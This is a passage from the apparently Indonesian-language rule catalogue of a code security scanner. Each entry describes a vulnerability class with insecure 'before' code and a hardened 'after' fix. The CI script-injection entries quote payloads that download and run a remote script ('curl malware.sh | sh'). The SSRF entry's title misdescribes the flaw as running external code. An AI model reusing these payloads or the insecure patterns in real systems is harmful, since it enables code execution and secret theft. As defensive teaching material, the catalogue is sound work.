      "Parser XML (DocumentBuilderFactory) dibuat tanpa secara eksplisit menonaktifkan entitas eksternal (DOCTYPE), di baris-baris terdekat. Jika parser menerima XML dari sumber yang tidak tepercaya, penyerang bisa mendefinisikan entitas eksternal untuk membaca file di server atau membuatnya menghubungi alamat pilihannya — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Rahasia ditulis langsung dalam instruksi ENV atau ARG di Dockerfile",
    description:
      "Variabel dengan nama seperti password/secret/token/key memiliki nilai literal dalam instruksi ENV atau ARG. Berbeda dari file .env (yang biasanya tidak berakhir di image), nilai ini tertanam langsung dalam image Docker itu sendiri — siapa pun yang bisa melakukan pull atau memeriksa riwayat layer bisa memulihkannya, bahkan jika barisnya dihapus di versi Dockerfile berikutnya.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# diteruskan dengan: docker build --build-arg DB_PASSWORD=*** (atau, lebih baik lagi,\n# dengan secret mount BuildKit, yang tidak pernah masuk ke riwayat layer)`,
    },
  },
  "k8s-privileged-container": {
    title: "Sebuah container dalam manifest Kubernetes berjalan sebagai privileged",
    description:
      '"privileged: true" dalam securityContext sebuah container menonaktifkan hampir semua isolasi normal antara container dan host: container bisa mengakses perangkat host, mengubah konfigurasi jaringannya, dan dalam banyak kasus secara efektif mendapatkan akses root pada mesin yang menjalankannya. Hampir tidak pernah dibutuhkan untuk aplikasi normal.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # hanya capability yang benar-benar diperlukan`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Rahasia ditulis dalam teks biasa di variabel env manifest Kubernetes",
    description:
      'Variabel lingkungan dengan nama seperti password/secret/token/key memiliki nilai literal ("value:") alih-alih dibaca dari Secret ("valueFrom.secretKeyRef"). Manifest itu sendiri — sering di-commit ke repositori — jadi berisi rahasia dalam teks biasa, terlihat bahkan oleh siapa pun yang hanya bisa membaca konfigurasi, tidak harus menjalankan perintah di cluster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Security group Terraform membuka port sensitif ke seluruh internet",
    description:
      'Aturan dengan "cidr_blocks" yang mencakup 0.0.0.0/0 (alamat IP mana pun) berada di dekat port sensitif — SSH (22), RDP (3389), atau port database umum (MySQL, Postgres, MongoDB, Redis, SQL Server). Siapa pun di internet bisa mencoba terhubung ke layanan itu, bukan hanya yang seharusnya.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # hanya jaringan privat Anda, atau sebuah bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Aturan firewall Google Cloud membuka port sensitif ke seluruh internet",
    description:
      'Resource "google_compute_firewall" dengan "source_ranges" yang mencakup 0.0.0.0/0 (alamat IP mana pun) mengizinkan trafik ke port sensitif — SSH (22), RDP (3389), atau port database umum (MySQL, Postgres, MongoDB, Redis, SQL Server). Siapa pun di internet bisa mencoba terhubung ke layanan itu, bukan hanya yang seharusnya.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # hanya jaringan privat Anda, atau sebuah bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Aturan jaringan Azure membuka port sensitif ke seluruh internet",
    description:
      'Aturan keamanan jaringan ("azurerm_network_security_rule", atau blok "security_rule" di dalam "azurerm_network_security_group") dengan "source_address_prefix" diisi "*" atau "0.0.0.0/0", arah "Inbound" dan akses "Allow", di dekat port sensitif — SSH (22), RDP (3389), atau port database umum. Siapa pun di internet bisa mencoba terhubung ke layanan itu, bukan hanya yang seharusnya.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # hanya jaringan privat Anda, atau sebuah bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Rahasia ditulis sebagai nilai default sebuah variabel Terraform",
    description:
      'Variabel dengan nama seperti password/secret/token/key memiliki nilai literal pada "default"-nya. Berbeda dari nilai yang diteruskan saat runtime (tfvars, variabel lingkungan TF_VAR_*), sebuah default berakhir di kode sumber — dan jika repositori dibagikan atau publik, siapa pun bisa melihatnya, bahkan tanpa akses ke state Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # tanpa default: harus diteruskan dengan file .tfvars (di luar git) atau variabel lingkungan TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Nilai yang dikendalikan pengguna eksternal masuk langsung ke perintah shell CI",
    description:
      'Perintah "run:" dalam workflow GitHub Actions langsung menyisipkan nilai seperti judul pull request, nama branch, atau teks komentar — semuanya bisa ditulis oleh siapa pun yang membuka pull request atau komentar, bahkan dari fork eksternal. Nilai seperti `"; curl malware.sh | sh #` akan menjalankan perintah arbitrer di CI, dengan akses ke semua secret yang tersedia di workflow itu.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # diteruskan sebagai variabel lingkungan, tidak pernah disisipkan langsung ke perintah`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow menjalankan kode dari pull request eksternal dengan akses ke secret repositori",
    description:
      'Workflow menggunakan "pull_request_target" — yang berjalan dengan izin dan secret repositori dasar bahkan untuk pull request yang dibuka dari fork yang tidak terkait — dan melakukan checkout kode dari pull request itu sendiri ("github.event.pull_request.head"), bukan branch dasar. Siapa pun yang membuka pull request itu secara efektif mendapatkan kodenya sendiri dijalankan dengan akses ke secret tersebut.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checkout branch dasar, bukan kode PR — atau gunakan\n      # "pull_request" alih-alih "pull_request_target" jika tidak memerlukan\n      # izin/secret yang lebih luas.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Data permintaan dideserialisasi dengan format yang bisa mengeksekusi kode",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), atau pustaka node-serialize (Node) sedang mendeserialisasi nilai yang diambil langsung dari permintaan. Berbeda dari JSON, format-format ini bisa merepresentasikan dan mengeksekusi kode selama proses deserialisasi itu sendiri — siapa pun yang mengendalikan nilai yang dikirim bisa mencapai eksekusi kode arbitrer di server.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON tidak pernah mengeksekusi kode saat parsing, berbeda dari pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Kode secara eksplisit menerima token JWT yang tidak ditandatangani (algoritma "none")',
    description:
      '"none" muncul di antara algoritma yang diterima untuk memverifikasi token JWT. Token dengan algoritma "none" tidak memiliki tanda tangan untuk diverifikasi: siapa pun bisa membuatnya dengan konten apa pun (mis. peran admin) dan kode akan menerimanya sebagai valid.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // jangan pernah menyertakan "none" di antara algoritma yang diterima`,
    },
  },
  "unprotected-new-table": {
    title: "Sebuah tabel baru tampaknya dibuat tanpa perlindungan",
    description:
      "Migrasi SQL membuat sebuah tabel tetapi tidak mengaktifkan Row Level Security untuk tabel itu di file yang sama. Selama tetap seperti ini, tabel itu lahir tanpa pembatasan apa pun atas siapa yang bisa membaca atau menulisnya.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Situs menerima permintaan dari situs web lain mana pun",
    description:
      "Header CORS diatur untuk menerima permintaan dari origin mana pun (*), atau middleware cors() digunakan tanpa pembatasan. Situs web pihak ketiga mana pun bisa memanggil API Anda dari browser pengguna yang sudah terautentikasi.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://situsanda.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Fungsi dengan izin admin tidak memeriksa siapa yang menggunakannya",
    description:
      "Rute atau fungsi yang namanya menunjukkan operasi admin tidak mengandung, di baris-baris terdekat, pemeriksaan autentikasi atau peran apa pun. Siapa pun yang mengetahui URL-nya bisa menjalankannya.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Situs bisa dipaksa menjalankan kode eksternal",
    description:
      "Permintaan HTTP keluar (fetch, axios) langsung menggunakan nilai yang berasal dari permintaan pengguna sebagai URL tujuan. Pengguna jahat bisa membuat server Anda memanggil alamat internal atau arbitrer — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.layanananda.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL tidak diizinkan")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Kata sandi dilindungi dengan metode yang kini mudah dibobol",
    description:
      "Pada baris yang sama, md5() atau sha1() diterapkan pada nilai yang terkait dengan kata sandi. Algoritma ini terlalu cepat dihitung: penyerang dengan akses ke database bisa mencoba miliaran kata sandi per detik.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Sebuah container dalam manifest Kubernetes diatur untuk berjalan sebagai root",
    description:
      '"runAsUser: 0" atau "runAsNonRoot: false" dalam securityContext secara eksplisit memaksa eksekusi sebagai root di dalam container. Jika penyerang berhasil menjalankan kode di dalam container (mis. dengan mengeksploitasi pustaka yang rentan), menjadi root di dalam container membuat pelarian ke host — atau dampak yang lebih luas — menjadi lebih mudah.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Sebuah container dalam manifest Kubernetes bisa mendapatkan lebih banyak privilese dari yang dimilikinya semula",
    description:
      '"allowPrivilegeEscalation: true" dalam securityContext memungkinkan proses di dalam container mendapatkan lebih banyak privilese daripada proses yang memulainya (mis. melalui binary dengan setuid). Dikombinasikan dengan kerentanan pada aplikasi, ini adalah satu langkah lagi menuju eksekusi kode dengan privilese lebih tinggi dari yang dimaksudkan.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Sebuah pod dalam manifest Kubernetes berbagi jaringan, proses, atau memori bersama milik host",
    description:
      '"hostNetwork", "hostPID", atau "hostIPC" yang diatur ke true mengeluarkan pod dari isolasi normalnya: hostNetwork mengekspos pod ke jaringan host (melewati kebijakan jaringan cluster), hostPID memberinya visibilitas atas semua proses di mesin host, hostIPC memberinya akses ke memori bersama host. Hampir tidak pernah dibutuhkan untuk aplikasi normal — biasanya hanya untuk alat sistem/pemantauan tingkat rendah.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access dinonaktifkan pada bucket S3 yang didefinisikan di Terraform",
    description:
      'Satu atau lebih dari empat proteksi "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) diatur ke false. Ini tidak berarti bucket-nya sudah publik, tapi menghilangkan jaring pengaman yang mencegahnya menjadi publik secara tidak sengaja di kemudian hari.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Policy IAM yang didefinisikan di Terraform memberikan akses penuh",
    description:
      'Statement dengan action "*" dan resource "*" memberikan akses penuh ke setiap layanan dan resource AWS — pemeriksaan yang sama dengan yang sudah dilakukan pada state IAM live, di sini dibaca langsung dari kode bahkan sebelum diterapkan. Mungkin dimaksudkan untuk peran darurat, tapi perlu dikonfirmasi: untuk penggunaan sehari-hari, berikan hanya izin yang benar-benar diperlukan.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::bucket-anda/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Sebuah bucket Google Cloud Storage dibuat bisa dibaca oleh siapa pun",
    description:
      'Resource "google_storage_bucket_iam_member" atau "google_storage_bucket_iam_binding" memberikan peran kepada "allUsers" atau "allAuthenticatedUsers" — yang pertama membuat bucket bisa dibaca oleh siapa pun di internet, bahkan tanpa akun Google; yang kedua oleh siapa pun yang memiliki akun Google apa pun, bukan hanya yang seharusnya memiliki akses.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:seseorang@example.com"  # hanya yang benar-benar harus memiliki akses, bukan allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Akses blob publik diaktifkan pada akun penyimpanan Azure",
    description:
      '"allow_blob_public_access" diatur ke true pada sebuah "azurerm_storage_account": siapa pun yang mengetahui URL blob/container yang dibuat publik bisa membacanya, tanpa autentikasi apa pun.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Sebuah peran IAM Google Cloud memberikan akses penuh (Owner/Editor)",
    description:
      'Sebuah "google_project_iam_binding"/"google_project_iam_member" (atau yang setara di tingkat organisasi/folder) menetapkan peran primitif "roles/owner" atau "roles/editor" — akses hampir penuh ke setiap layanan dalam proyek. Mungkin dimaksudkan untuk akun darurat, tapi perlu dikonfirmasi: untuk penggunaan sehari-hari, berikan hanya peran bawaan yang lebih spesifik yang benar-benar diperlukan.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # hanya peran bawaan yang benar-benar diperlukan, bukan roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Sebuah penetapan peran Azure memberikan akses penuh (Owner)",
    description:
      'Sebuah "azurerm_role_assignment" menetapkan peran "Owner" — akses penuh, termasuk kontrol atas izin pengguna lain, di seluruh scope yang ditetapkan (subscription, resource group...). Mungkin dimaksudkan untuk akun darurat, tapi perlu dikonfirmasi: untuk penggunaan sehari-hari, berikan hanya peran yang lebih spesifik yang benar-benar diperlukan (mis. "Contributor" pada satu resource group).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # hanya peran yang lebih spesifik yang benar-benar diperlukan, bukan Owner di seluruh subscription\n}`,
    },
  },
  "weak-random-token": {
    title: "Token keamanan dihasilkan dengan generator angka acak yang tidak aman",
    description:
      "Nilai dengan nama seperti token/session/reset/otp/csrf dihasilkan dengan Math.random() (JS), random.random() (Python), atau rand() (PHP) — generator yang tidak dirancang untuk keamanan, yang urutannya bisa diprediksi. Token yang dihasilkan dengan cara ini bisa ditebak atau direkonstruksi, menggagalkan tujuan keberadaannya (mis. tautan reset kata sandi yang bisa diprediksi siapa pun).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, bukan Math.random — tidak bisa diprediksi`,
    },
  },
  "ldap-injection": {
    title: "Filter LDAP dibangun dengan langsung menggabungkan nilai dari permintaan",
    description:
      'Baris yang membangun filter LDAP (mis. "(uid=...)") langsung menyertakan nilai yang diambil dari permintaan, tanpa escaping karakter khusus LDAP. Siapa pun yang mengendalikan nilai itu bisa mengubah logika filter — misalnya melewati pemeriksaan autentikasi atau membaca data direktori yang seharusnya tidak dia lihat.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // karakter khusus LDAP harus selalu di-escape sebelum digunakan dalam filter\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "Teks yang ditulis pengguna bisa menjalankan kode di browser",
    description:
      "Konten dimasukkan ke halaman sebagai HTML mentah (dangerouslySetInnerHTML, v-html, .innerHTML) alih-alih sebagai teks biasa. Jika konten itu mencakup input pengguna, ia bisa berisi skrip yang berjalan di browser siapa pun yang membaca halaman tersebut.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// atau, jika memerlukan HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Ruang untuk file yang diunggah terlihat oleh siapa pun",
    description:
      "Bucket penyimpanan (Supabase Storage, S3) dikonfigurasi sebagai publik. Jika berisi dokumen, foto, atau file yang diunggah pengguna, siapa pun yang mengetahui — atau menebak — path-nya bisa mengaksesnya tanpa autentikasi.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// sajikan file dengan URL bertanda tangan berbatas waktu: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Cukup satu tautan untuk menghapus atau mengubah data",
    description:
      "Rute GET melakukan operasi yang mengubah data (path-nya mengandung delete/remove/update/edit). Permintaan GET berjalan hanya dengan mengunjungi tautan atau memuat gambar dari situs eksternal — titik tumpu klasik untuk serangan CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Data login yang disimpan di browser tidak terlindungi dengan baik",
    description:
      "Token akses disimpan di localStorage. Berbeda dari cookie httpOnly, skrip apa pun yang berjalan di halaman (termasuk skrip jahat yang disuntikkan lewat XSS) bisa membaca dan mencurinya.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// atur token sebagai cookie httpOnly dari server:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Situs bisa digunakan untuk mengarahkan ke situs penipuan",
    description:
      "Situs mengarahkan pengguna ke alamat yang diambil langsung dari permintaan (query, body, params) tanpa memeriksa apakah itu domain yang dikenal. Tautan yang tampak menuju ke situs Anda bisa sebenarnya mengarah ke halaman phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Mengubah sebuah angka di alamat bisa menampilkan data orang lain",
    description:
      "Query database langsung menggunakan identifier yang diambil dari URL (req.params.id) tanpa memverifikasi, di baris-baris terdekat, bahwa itu milik pengguna yang membuat permintaan. Mengubah id di alamat bisa memberikan akses ke data pengguna lain — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Formulir login tidak memblokir terlalu banyak percobaan berturut-turut",
    description:
      "Rute login didefinisikan dalam file, tapi tidak ada jejak middleware rate-limiting di file yang sama. Tanpa batas percobaan, penyerang bisa mencoba kata sandi secara berurutan (brute force) tanpa diperlambat.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Kata sandi atau data sensitif berakhir di log",
    description:
      "Pemanggilan console.log (atau sejenisnya) menyertakan variabel bernama password, token, secret, atau apiKey. Jika log ini berakhir di layanan eksternal atau file, data sensitif tetap terekspos jauh lebih lama dari yang diperlukan.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "header-injection": {
    title: "Nilai dari permintaan berakhir langsung di header HTTP respons",
    description:
      "Header HTTP respons diatur dengan nilai yang diambil langsung dari permintaan (query, body, params), tanpa memeriksa apakah mengandung baris baru (CRLF). Penyerang bisa menyisipkan header tambahan atau bahkan seluruh respons yang berbeda — response splitting — yang berpotensi memanipulasi cache, cookie, atau konten yang ditampilkan ke pengguna lain.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "Sebuah action pihak ketiga di CI tidak dikunci ke versi yang presisi (commit SHA)",
    description:
      'Workflow menggunakan action pihak ketiga yang direferensikan lewat tag atau branch (mis. "@v1", "@main") alih-alih commit SHA. Siapa pun yang mengelolanya — atau siapa pun yang membobol akunnya — bisa memindahkan referensi itu ke commit lain kapan saja, secara diam-diam mengubah apa yang berjalan di CI, dengan akses ke secret-nya. Commit SHA selalu menunjuk ke kode yang persis sama.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, dikunci ke commit SHA — perbarui SHA-nya saat Anda memperbarui versinya`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow memberikan dirinya semua izin token alih-alih hanya yang digunakan",
    description:
      '"permissions: write-all" memberikan GITHUB_TOKEN workflow akses tulis ke segalanya — issue, pull request, paket, deployment — bahkan jika workflow hanya menggunakan sebagiannya. Jika sebuah langkah dalam workflow dibobol (dependensi jahat, skrip yang disuntikkan), izin yang lebih luas itu meningkatkan apa yang bisa dilakukan oleh siapa pun yang mengeksploitasinya.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # hanya izin yang benar-benar digunakan workflow`,
    },
  },
  "insecure-cookie-flags": {
    title: "Cookie sesi atau autentikasi diatur tanpa flag Secure dan HttpOnly",
    description:
      'Cookie dengan nama yang menyerupai session/auth/token diatur tanpa "httpOnly" dan "secure" di antara opsinya. Tanpa httpOnly, JavaScript di halaman — termasuk kode yang disuntikkan lewat XSS — bisa membaca cookie itu. Tanpa secure, cookie itu juga bisa dikirim lewat koneksi HTTP yang tidak terenkripsi.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dependensi rentan:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Belum ada versi perbaikan yang diketahui — pertimbangkan paket alternatif atau ikuti pembaruan proyek."
      ),
    },
  }),
  "docker-missing-user": {
    title: "Dockerfile tidak mengatur pengguna non-root",
    description:
      "Tidak ada instruksi USER di Dockerfile: tanpa itu, container berjalan sebagai root. Jika penyerang berhasil menjalankan kode di dalam container (mis. dengan mengeksploitasi pustaka yang rentan), menjadi root di dalam container membuat pelarian ke host — atau dampak yang lebih luas pada sistem sekitarnya — menjadi lebih mudah.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Manifest Kubernetes tidak secara eksplisit mewajibkan eksekusi sebagai pengguna non-root",
    description:
      'Tidak ada "runAsNonRoot" di mana pun dalam manifest (baik di tingkat pod maupun container): tanpa mengaturnya, container berjalan sebagai pengguna apa pun yang didefinisikan image-nya — sering kali root secara default, jika image itu sendiri belum mengubahnya. Mengaturnya secara eksplisit ke true membuat pod gagal dimulai jika image tetap mencoba berjalan sebagai root, alih-alih baru diketahui setelah terjadi insiden.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Image dasar Dockerfile menggunakan tag ":latest"',
    description:
      'Sebuah instruksi FROM secara eksplisit menggunakan tag ":latest" alih-alih versi yang presisi. "latest" berubah seiring waktu: build yang sama, diulang di waktu lain, bisa mendapatkan versi image dasar yang berbeda — build yang tidak reproducible, dan pembaruan yang tidak diinginkan bisa datang tanpa ada yang memutuskannya.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile mengunduh file jarak jauh dengan ADD alih-alih COPY",
    description:
      "Instruksi ADD dengan URL http/https mengunduh file dari internet selama build, tanpa pemeriksaan integritas dan tanpa konten yang terlihat di repositori. Jika URL itu pernah dibobol, build akan menyertakan konten arbitrer tanpa ada yang menyadarinya hanya dengan membaca Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash yang diharapkan>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'Nilai yang dikendalikan pengguna eksternal melewati shell kedua dalam pipeline GitLab CI',
      description: 'Baris "script:" (atau "before_script:"/"after_script:") menggunakan "eval" atau "sh -c"/"bash -c" bersama variabel bawaan GitLab seperti judul merge request, pesan commit, atau nama branch — semuanya bisa ditulis oleh siapa saja yang membuka merge request, bahkan dari fork eksternal. Nilainya di-expand sekali oleh shell luar lalu ditempelkan ke dalam string yang diinterpretasikan ulang sebagai kode oleh shell kedua: judul seperti "$(curl malware.sh | sh)" akan menjalankan perintah apa pun di pipeline, dengan akses ke semua secret yang tersedia di job tersebut.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # diteruskan sebagai argumen ke perintah, tidak pernah di dalam string "bash -c" yang akan menginterpretasikannya ulang`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker pada pipeline GitLab CI berjalan dengan enkripsi TLS dimatikan',
      description: 'Job ini menggunakan layanan "docker:dind" (Docker-in-Docker, diperlukan untuk membangun image di dalam pipeline) tetapi menyetel "DOCKER_TLS_CERTDIR" ke string kosong, sepenuhnya mematikan enkripsi TLS antara klien Docker dan daemon dind. Tanpa TLS, siapa pun yang bisa menjangkau port tersebut di jaringan internal runner yang sama dapat mengendalikan daemon Docker — yang berjalan dengan hak istimewa yang diperluas — bukan hanya terbatas pada job yang seharusnya menggunakannya.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS tetap aktif antara klien Docker dan daemon dind — "" mematikannya sepenuhnya`,
      },
    },
